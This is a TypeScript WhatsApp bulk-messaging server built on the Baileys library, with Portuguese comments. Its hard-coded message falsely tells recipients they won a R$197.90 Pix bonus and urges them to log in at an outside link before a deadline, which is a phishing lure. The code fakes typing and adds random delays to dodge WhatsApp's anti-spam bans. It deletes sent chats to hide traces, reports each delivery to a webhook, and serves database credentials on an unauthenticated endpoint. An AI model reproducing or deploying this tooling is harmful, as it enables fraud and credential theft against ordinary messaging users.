import "dotenv/config";
import fs from "fs";
import express from "express";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client.ts";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

const AUTH_DIR = "auth_info_baileys";
const PORT = 3000;

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

let waVersion: [number, number, number] = [2, 3000, 1035194821];

// Busca a versão mais recente do Baileys ao iniciar
fetchLatestBaileysVersion()
  .then(({ version }) => {
    waVersion = version;
  })
  .catch((err) => {
    console.warn("Aviso: falha ao buscar versão do Baileys. Usando fallback.", err);
  });

// ──────────────────────────────────────────────────────────
// Conexão principal com o WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp(): Promise<WASocket> {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version: waVersion,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: Browsers.ubuntu("Chrome"),
    markOnlineOnConnect: true,
  });

  sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(`Conexão fechada — código: ${statusCode}, reconectar: ${shouldReconnect}`);
      connectionStatus = "close";

      // Limpa o socket atual
      try {
        sock?.ev.removeAllListeners("connection.update");
        sock?.ev.removeAllListeners("creds.update");
        sock?.end(undefined);
      } catch {
        // ignora erros no encerramento
      }
      sock = null;

      // Só reconecta se houver credenciais salvas e o motivo não for logout
      const hasCredentials = fs.existsSync(`${AUTH_DIR}/creds.json`);
      if (shouldReconnect && hasCredentials) {
        console.log("Credenciais ativas encontradas. Reconectando em 5s...");
        await delay(5000);
        connectToWhatsApp().catch((err) => console.error("Erro ao reconectar:", err));
      } else {
        console.log("Não reconectando: sessão encerrada ou inexistente.");
      }
    } else if (connection === "open") {
      console.log("✅ WhatsApp conectado com sucesso!");
      connectionStatus = "open";
      pairingCode = null;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// Inicialização silenciosa se já houver sessão ativa
if (fs.existsSync(`${AUTH_DIR}/creds.json`)) {
  console.log("Sessão anterior encontrada. Conectando ao WhatsApp...");
  connectToWhatsApp().catch((err) => console.error("Erro ao iniciar conexão:", err));
}

// ──────────────────────────────────────────────────────────
// Webhook de retorno de disparos
// ──────────────────────────────────────────────────────────
async function triggerWebhook(status: string, target: string, messageId: string): Promise<void> {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    await axios.post(webhookUrl, {
      status,
      target,
      messageId,
      timestamp: new Date().toISOString(),
      reward: 0.1,
    });
  } catch (err) {
    console.error("Erro ao disparar Webhook:", err);
  }
}

// ──────────────────────────────────────────────────────────
// ROTAS
// ──────────────────────────────────────────────────────────

const apiRouter = express.Router();

/** Status da conexão */
apiRouter.get("/status", (_req, res) => {
  res.json({
    status: connectionStatus,
    pairingCode,
    connectedAs: sock?.authState?.creds?.me?.id ?? null,
  });
});

/** Iniciar conexão e gerar Pairing Code */
apiRouter.post("/connect", async (req, res) => {
  const { phone } = (req.body ?? {}) as { phone?: string };
  if (!phone) {
    res.status(400).json({ error: "Telefone é obrigatório" });
    return;
  }

  const cleanPhone = String(phone).replace(/\D/g, "");

  try {
    console.log(`Iniciando pareamento para: ${cleanPhone}`);

    // Encerra socket anterior
    if (sock) {
      try {
        sock.ev.removeAllListeners("connection.update");
        sock.ev.removeAllListeners("creds.update");
        sock.end(undefined);
      } catch {
        // ignora
      }
      sock = null;
    }

    // Remove sessão anterior para evitar conflito de credenciais
    if (fs.existsSync(AUTH_DIR)) {
      fs.rmSync(AUTH_DIR, { recursive: true, force: true });
    }

    connectionStatus = "close";
    pairingCode = null;

    await connectToWhatsApp();
    // Aguarda o socket inicializar antes de solicitar o código
    await new Promise((resolve) => setTimeout(resolve, 1500));

    if (!sock) {
      throw new Error("Não foi possível inicializar o socket do WhatsApp");
    }

    const code = await sock.requestPairingCode(cleanPhone);
    pairingCode = code ?? null;
    connectionStatus = "pairing";

    res.json({ pairingCode: code });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao gerar pairing code:", msg);
    res.status(500).json({ error: `Erro ao gerar pairing code: ${msg}` });
  }
});

/** Logout e remoção completa da sessão */
apiRouter.post("/disconnect", async (_req, res) => {
  try {
    if (sock) {
      try {
        sock.ev.removeAllListeners("connection.update");
        sock.ev.removeAllListeners("creds.update");
        await sock.logout();
        sock.end(undefined);
      } catch {
        // ignora erros no logout
      }
      sock = null;
    }

    if (fs.existsSync(AUTH_DIR)) {
      fs.rmSync(AUTH_DIR, { recursive: true, force: true });
    }

    pairingCode = null;
    connectionStatus = "close";

    res.json({ success: true });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao desconectar:", msg);
    res.status(500).json({ error: `Erro ao desconectar: ${msg}` });
  }
});

/** Disparo em massa com algoritmo antiban */
apiRouter.post("/disparar", async (req, res) => {
  const { targets } = (req.body ?? {}) as { targets?: unknown[] };

  if (!sock || connectionStatus !== "open") {
    res.status(400).json({ error: "WhatsApp não conectado" });
    return;
  }

  if (!Array.isArray(targets) || targets.length === 0) {
    res.status(400).json({ error: "Lista de alvos inválida" });
    return;
  }

  // Responde imediatamente para liberar o cliente
  res.json({ status: "queueing", count: targets.length });

  for (const targetRaw of targets) {
    try {
      const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";

      // 1. Simula digitação (7–12 segundos aleatório)
      const typingMs = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
      await sock.sendPresenceUpdate("composing", target);
      await delay(typingMs);
      await sock.sendPresenceUpdate("paused", target);

      // 2. Envia a mensagem fixa
      const sentMsg = await sock.sendMessage(target, { text: FIXED_MESSAGE });

      if (sentMsg) {
        // 3. Apaga o chat local para não deixar rastros
        await sock.chatModify(
          {
            delete: true,
            lastMessages: [
              {
                key: sentMsg.key,
                messageTimestamp: sentMsg.messageTimestamp ?? 0,
              },
            ],
          },
          target,
        );

        // 4. Dispara webhook de confirmação
        await triggerWebhook("success", target, sentMsg.key.id ?? "");
      }

      // 5. Delay humano aleatório (30–45 segundos) — antiban
      const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
      console.log(`✉️  Enviado para ${target}. Próximo em ${nextDelay / 1000}s...`);
      await delay(nextDelay);
    } catch (err) {
      console.error(`Erro ao disparar para ${targetRaw}:`, err);
    }
  }
});

/** Busca contatos do Supabase */
apiRouter.get("/contatos", async (_req, res) => {
  try {
    const result = await getContactsFromDB();
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

/** Importação em massa de contatos (via CSV do painel admin) */
apiRouter.post("/contatos/importar", async (req, res) => {
  const { phones } = (req.body ?? {}) as { phones?: unknown };

  if (!phones || !Array.isArray(phones)) {
    res.status(400).json({
      success: false,
      error: "Formato inválido. Esperado: { phones: string[] }",
    });
    return;
  }

  try {
    const result = await importContacts(phones as string[]);
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos/importar:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

/** Verificação das credenciais do banco (uso administrativo) */
apiRouter.get("/db-credentials", (_req, res) => {
  try {
    const creds = getDBCredentials();
    res.json(creds);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    res.status(500).json({ success: false, error: msg });
  }
});

// Suporta prefixos /api e /api/wa
app.use("/api/wa", apiRouter);
app.use("/api", apiRouter);

// ──────────────────────────────────────────────────────────
// Inicia o servidor
// ──────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 WhatsApp Server rodando na porta ${PORT}`);
  console.log(`   Status:   GET  /api/status`);
  console.log(`   Conectar: POST /api/connect`);
  console.log(`   Disparar: POST /api/disparar`);
  console.log(`   Contatos: GET  /api/contatos`);
});
